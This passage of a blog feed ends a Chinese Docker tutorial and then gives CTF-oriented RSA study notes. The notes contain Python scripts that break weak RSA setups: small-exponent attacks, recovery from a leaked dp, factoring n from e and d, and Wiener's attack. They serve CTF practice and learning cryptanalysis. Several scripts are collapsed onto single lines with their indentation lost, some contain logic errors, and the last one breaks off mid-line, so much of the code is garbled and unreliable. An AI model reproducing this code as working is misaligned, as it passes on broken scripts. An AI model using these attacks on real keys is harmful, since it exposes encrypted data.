href="#容器文件拷贝" class="headerlink" title="容器文件拷贝"></a>容器文件拷贝</h3><p>#从容器内拷贝<br><code>docker cp 容器ID/名称: 容器内路径  容器外路径</code></p><p>#从容器外拷贝<br><code>docker  cp 容器外路径 容器ID/名称: 容器内路径</code></p><h2 id="Dockerfiles"><a href="#Dockerfiles" class="headerlink" title="Dockerfiles"></a>Dockerfiles</h2><blockquote><p>Dockerfile 包含创建镜像所需要的全部指令。基于在 Dockerfile 中的指令，我们可以使用 <code>Docker build</code> 命令来创建镜像。通过减少镜像和容器的创建过程来简化部署。</p></blockquote><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>所有 Dockerfile 都必须以 <code>FROM</code> 命令开始。<code>FROM</code> 命令会指定镜像基于哪个基础镜像创建，接下来的命令也会基于这个基础镜像（注：CentOS 和 Ubuntu 有些命令可是不一样的）。<code>FROM</code> 命令可以多次使用，表示会创建多个镜像。具体语法如下：</p><p><code>FROM &lt;image name&gt;</code></p><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>设置该镜像的作者，可以写自己名字</p><p><code>MAINTAINER &lt;author name&gt;</code></p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>在 shell 或者 exec 的环境下执行的命令。<code>RUN</code>指令会在新创建的镜像上添加新的层面，接下来提交的结果用在Dockerfile的下一条指令中。语法如下：</p><p><code>RUN &lt;command&gt;</code></p><p>简单的说就是可以执行命令行的指令，在镜像开始的时候进行运行</p><p>例：<code>RUN yum install wget</code></p><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>指定容器在运行时监听的端口。</p><p><code>EXPOSE &lt;port&gt;</code></p><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>指定<code>RUN</code>、<code>CMD</code>与<code>ENTRYPOINT</code>命令的工作目录。类似cd，语法如下</p><p><code>WORKDIR /var/www/html</code></p><p>表示建立在网址根目录之下</p><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809085421.png"></p><h3 id="ADD-amp-COPY"><a href="#ADD-amp-COPY" class="headerlink" title="ADD&amp;COPY"></a>ADD&amp;COPY</h3><p>这里把ADD和COPY两个指令放一起，说明它们两个功能很类似。有时候，随便使用哪一个都行，它们的作用都是把本地的文件添加到Docker image里面。两者唯一的区别是，ADD的功能更强大一些，ADD会拷贝文件并且解压文件，COPY只能拷贝文件。</p><p><code>ADD &lt;source&gt; &lt;destination&gt;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809085625.png"></p><p>例如第一个指令的意思就是将hello复制到接下来要build的docker image的根目录（hello为本地文件）</p><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>设置环境变量</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809085855.png"></p><p>这里用一张趣味的图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809090110.png"></p><h2 id="创建简单的apache服务器"><a href="#创建简单的apache服务器" class="headerlink" title="创建简单的apache服务器"></a>创建简单的apache服务器</h2><ul><li><p>首先创建一个文件夹，存放dockerfile和index.html</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809094937.png"></p></li></ul><ul><li><p>编写index.html</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809095345.png"></p><p>很简单的显示页面，完成后保存</p></li><li><p>编写dockerfile</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809095615.png"></p><p>大致意思就是选自apache2-php7的镜像，并将index.html页面复制到目录下，使它显示在根目录，用80端口也就是将他们以网页的形式显示出来</p></li></ul><ul><li><p>进行创建镜像</p><p>命令：<code>docker build -t test .</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809095706.png"></p><ul><li><p>将端口映射出去</p><p>命令：<code>docker run -i -d -p 30002:80 test</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809100906.png"></p></li></ul><ul><li><p>打开网页</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809101006.png"></p></li></ul><p>​    完成一个简单的apache服务器</p><h2 id="Portainer-安装与配置"><a href="#Portainer-安装与配置" class="headerlink" title="Portainer 安装与配置"></a>Portainer 安装与配置</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><blockquote><p>  Portainer 是一个开源、轻量级Docker管理用户界面，基于Docker API，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。</p></blockquote><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ul><li><p>搜索镜像</p><p><code>docker search portainer/portainer</code></p></li><li><p>拉取镜像</p><p><code>docker pull portainer/portainer</code></p></li><li><p>运行镜像</p><p><code>docker run -d -p 9000:9000 -v /root/portainer:/data -v /var/run/docker.sock:/var/run/docker.sock --name dev-portainer portainer/portainer</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808233647.png"></p><h3 id="本机访问"><a href="#本机访问" class="headerlink" title="本机访问"></a>本机访问</h3><p>访问端口9000即可</p><p>首次登陆设置密码即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808234102.png"></p><p>这里选择local即可，remote是集群，反正也不知道啥意思，用着先</p><p>成功后即可看到本机上的容器情况</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808234302.png"></p><p>那我觉得还是命令行的好用一些，更快捷，图形化更形象</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;Docker学习笔记&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Docker</summary>
      
    
    
    
    <category term="-Docker" scheme="https://abinix.top/categories/Docker/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA学习笔记</title>
    <link href="https://abinix.top/2021/07/31/RSA%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/07/31/RSA%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-30T16:00:19.000Z</published>
    <updated>2021-08-12T16:28:19.683Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">RSA学习笔记</h1><h2 id="首先引用一张神图！不会就来看看"><a href="#首先引用一张神图！不会就来看看" class="headerlink" title="首先引用一张神图！不会就来看看"></a>首先引用一张神图！不会就来看看</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210723085330.png"></p><p>说实话，rsa一把梭就行，有脚本就是哥，毕竟高数我们学的少，也很难理解</p><p>所以，梭就完事了</p><h2 id="简介RSA"><a href="#简介RSA" class="headerlink" title="简介RSA"></a>简介RSA</h2><blockquote><p>RSA是一种非对称加密;RSA是一种公认的非常安全的公钥加密方式，我们长见的SSL协议采用的加密方式就是RSA非对称加密；RSA加密使用公钥，解密使用私钥，所以是非对称加密，公钥可由私钥生成。</p></blockquote><ul><li><p>选择两个大的参数，计算出模数 N = p * q</p></li><li><p>计算欧拉函数 φ = (p-1) * (q-1)，然后选择一个e(1&lt;e&lt;φ)，并且e和φ互质（互质：公约数只有1的两个整数）</p></li><li><p>取e的模反数d，计算方法为:e * d ≡ 1 (mod φ) （模反元素：如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说5除3余数为2，11除3余数也为2，于是可写成11 ≡ 5(mod 3)。）</p></li><li><p><strong>“≡”是数论中表示同余的符号</strong> 以上的理论也可以这么理解：</p><p>给定一个正整数m，如果两个整数a和b满足a - b能被m整除，即(a - b)modm=0，<br>那么就称<strong>整数a与b对模m同余</strong>，记作a ≡ b ( mod m)，同时可成立<strong>a mod m = b</strong><br>注意，同余与模运算是不同的<br>显然,有如下事实</p><p>（1）若a≡0(mod m)，则m|a；<br>（2）a≡b(mod m)等价于a与b分别用m去除，余数相同。</p></li><li><p>对明文m进行加密：c = pow(m, e, N),可以得到密文c。</p></li><li><p>对密文c进行解密：m = pow(c, d, N),可以得到明文m。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>p 和 q：两个大的质数，是另一个参数N的的两个因子。</li><li>N：大整数，可以称之为模数</li><li>e 和 d：互为无反数的两个指数 ，e为公钥，d为私钥</li><li>c 和 m：密文和明文</li><li>(N, e)：公钥</li><li>(N, d)：私钥</li><li>pow(x, y, z)：效果等效pow(x, y)1 % z， 先计算x的y次方，如果存在另一个参数z，需要再对结果进行取模。</li><li>密钥长度：n以二进制表示的的位数，例如密钥长度为512代表n用二进制表示的长度为512bit。1</li></ol><h2 id="关于n的分解"><a href="#关于n的分解" class="headerlink" title="关于n的分解"></a>关于n的分解</h2><p>有些题目中只给一个n，这时我们需要利用工具解出p，q</p><p><strong>当n很小时</strong> 我们可以通过在线网站 <a href="http://factordb.com/">http://factordb.com/</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210723085021.png"></p><p><strong>当n很大时</strong>，在线工具并不能解出</p><p>下载 yafu工具 <a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a>  下载完成后cmd进入当前目录下</p><p>输入命令 <code>.\yafu-x64.exe</code> 进入exe文件</p><p>命令为 <code>factor(需要分解的大数)</code></p><p>如下图，成功分解</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210723084908.png"></p><h2 id="RSA分类"><a href="#RSA分类" class="headerlink" title="RSA分类"></a>RSA分类</h2><h3 id="已知e-p-q求d"><a href="#已知e-p-q求d" class="headerlink" title="已知e,p,q求d"></a>已知e,p,q求d</h3><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">38456719616722997</span></span><br><span class="line">q = <span class="number">44106885765559411</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line">s = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,s)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dec: &quot;</span> + <span class="built_in">str</span>(d))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;hex: &quot;</span> +  <span class="built_in">hex</span>(d))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="已知e，p，q，c-求明文"><a href="#已知e，p，q，c-求明文" class="headerlink" title="已知e，p，q，c 求明文"></a>已知e，p，q，c 求明文</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p =  gp.mpz()</span><br><span class="line">q =  gp.mpz()</span><br><span class="line">e =  gp.mpz()</span><br><span class="line">c =  gp.mpz()</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gp.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><h3 id="已知e-d-n求p-q"><a href="#已知e-d-n求p-q" class="headerlink" title="已知e,d,n求p,q"></a>已知e,d,n求p,q</h3><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span>(<span class="params">n, e, d</span>):</span></span><br><span class="line">    p = <span class="number">1</span></span><br><span class="line">    q = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> p == <span class="number">1</span> <span class="keyword">and</span> q == <span class="number">1</span>:</span><br><span class="line">        k = d * e - <span class="number">1</span></span><br><span class="line">        g = random.randint(<span class="number">0</span>, n)</span><br><span class="line">        <span class="keyword">while</span> p == <span class="number">1</span> <span class="keyword">and</span> q == <span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k /= <span class="number">2</span></span><br><span class="line">            y = <span class="built_in">pow</span>(g, k, n)</span><br><span class="line">            <span class="keyword">if</span> y != <span class="number">1</span> <span class="keyword">and</span> gcd(y - <span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gcd(y - <span class="number">1</span>, n)</span><br><span class="line">                q = n / p</span><br><span class="line">        <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">n = 0x</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = 0x</span><br><span class="line">p, q = getpq(n, e, d)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;p: &quot;</span> + <span class="built_in">hex</span>(p)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;q: &quot;</span> + <span class="built_in">hex</span>(q)</span><br></pre></td></tr></table></figure><h3 id="已知n-e求秘钥d"><a href="#已知n-e求秘钥d" class="headerlink" title="已知n,e求秘钥d"></a>已知n,e求秘钥d</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span> (d)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="低指数加密（e-1）"><a href="#低指数加密（e-1）" class="headerlink" title="低指数加密（e=1）"></a>低指数加密（e=1）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N_hex=0x</span><br><span class="line">e_hex=<span class="number">0x1</span></span><br><span class="line">c_hex=0x</span><br><span class="line">c_hex = gmpy2.mpz(c_hex)</span><br><span class="line">N_hex = gmpy2.mpz(N_hex)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">    m_hex = <span class="built_in">hex</span>(c_hex + gmpy2.mpz(<span class="built_in">hex</span>(i))*N_hex)</span><br><span class="line">    <span class="built_in">print</span>(m_hex[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(binascii.a2b_hex(m_hex[<span class="number">2</span>:]).decode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;位数非偶数，跳过...&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="低指数加密（e-2）"><a href="#低指数加密（e-2）" class="headerlink" title="低指数加密（e=2）"></a>低指数加密（e=2）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 适合e=2</span></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取公钥参数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp/pubkey.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">    </span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp/flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    cipher = string.atoi(cipher, base=<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># print cipher</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算yp和yq</span></span><br><span class="line">yp = gmpy.invert(p,q)</span><br><span class="line">yq = gmpy.invert(q,p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算mp和mq</span></span><br><span class="line">mp = <span class="built_in">pow</span>(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算a,b,c,d</span></span><br><span class="line">a = (yp * p * mq + yq * q * mp) % N</span><br><span class="line">b = N - <span class="built_in">int</span>(a)</span><br><span class="line">c = (yp * p * mq - yq * q * mp) % N</span><br><span class="line">d = N - <span class="built_in">int</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a,b,c,d):</span><br><span class="line">    s = <span class="string">&#x27;%x&#x27;</span> % i</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">&#x27;0&#x27;</span> + s</span><br><span class="line">    <span class="built_in">print</span> s.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="e-3小指数明文攻击"><a href="#e-3小指数明文攻击" class="headerlink" title="e=3小指数明文攻击"></a>e=3小指数明文攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res=iroot(c+k*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>]==<span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k=k+<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="已知n-e-c求m"><a href="#已知n-e-c求m" class="headerlink" title="已知n,e,c求m"></a>已知n,e,c求m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">c,e,p,q</span>):</span></span><br><span class="line">L=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,L)</span><br><span class="line">n=p*q</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line">flag=<span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c = </span><br><span class="line">Decrypt(c,e,p,q)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="已知e，n，dp，c-求明文"><a href="#已知e，n，dp，c-求明文" class="headerlink" title="已知e，n，dp，c 求明文"></a>已知e，n，dp，c 求明文</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gpe = n = gp.mpz()dp = gp.mpz()c = gp.mpz()<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):    <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):        p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span>        <span class="keyword">if</span>(n%p!=<span class="number">0</span>):            <span class="keyword">continue</span>        q=n//p        phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)        d=gp.invert(e, phin)        m=gp.powmod(c, d, n)        <span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):            <span class="keyword">continue</span>        <span class="built_in">print</span>(<span class="string">&#x27;--------------&#x27;</span>)        <span class="built_in">print</span>(m)        <span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h3 id="由p-q-dp-dq-c求明文的算法"><a href="#由p-q-dp-dq-c求明文的算法" class="headerlink" title="由p,q,dp,dq,c求明文的算法"></a>由p,q,dp,dq,c求明文的算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gpp = gp.mpz()q = gp.mpz()dp = gp.mpz()dq = gp.mpz()c = gp.mpz()n = p*qphin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)dd = gp.gcd(p-<span class="number">1</span>, q-<span class="number">1</span>)d=(dp-dq)//dd * gp.invert((q-<span class="number">1</span>)//dd, (p-<span class="number">1</span>)//dd) * (q-<span class="number">1</span>) +dqprint(d)m = gp.powmod(c, d, n)<span class="built_in">print</span>(<span class="string">&#x27;-------------------&#x27;</span>)<span class="built_in">print</span>(m)<span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><h3 id="低解密指数攻击（e较大）"><a href="#低解密指数攻击（e较大）" class="headerlink" title="低解密指数攻击（e较大）"></a>低解密指数攻击（e较大）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  RSAwienerHackern=e=d =  RSAwienerHacker.hack_RSA(e,n)<span class="keyword">if</span> d:    <span class="built_in">print</span>(d)<span class="keyword">import</span> hashlibflag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="Wiener’s-attack"><a href="#Wiener’s-attack" class="headerlink" title="Wiener’s attack"></a>Wiener’s attack</h3><p>例题：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724172910.png"></p><p><strong>当e很大，d就会尽可能的小</strong>，就会满足Wiener’s attack的条件</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2def transform(x,y):       <span class="comment">#使用辗转相处将分数 x/y 转为连分数的形式    res=[]    while y:        res.append(x//y)        x,y=y,x%y    return res    def continued_fraction(sub_res):    numerator,denominator=1,0    for i in sub_res[::-1]:      #从sublist的后面往前循环        denominator,numerator=numerator,i*numerator+denominator    return denominator,numerator   #得到渐进分数的分母和分子，并返回    #求解每个渐进分数def sub_fraction(x,y):    res=transform(x,y)    res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #将连分数的结果逐一截取以求渐进分数    return resdef get_pq(a,b,c):      #由p+q和pq的值通过维达定理来求解p和q    par=gmpy2.isqrt(b*b-4*a*c)   #由上述可得，开根号一定是整数，因为有解    x1,x2=(-b+par)//(2*a),(-b-par)//(2*a)    return x1,x2def wienerAttack(e,n):    for (d,k) in sub_fraction(e,n):  #用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数        if k==0:                     #可能会出现连分数的第一个为0的情况，排除            continue        if (e*d-1)%k!=0:             #ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)            continue                phi=(e*d-1)//k               #这个结果就是 φ(n)        px,qy=get_pq(1,n-phi+1,n)        if px*qy==n:            p,q=abs(int(px)),abs(int(qy))     #可能会得到两个负数，负负得正未尝不会出现            d=gmpy2.invert(e,(p-1)*(q-1))     #求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d            return d    print(&quot;该方法不适用&quot;)        e = 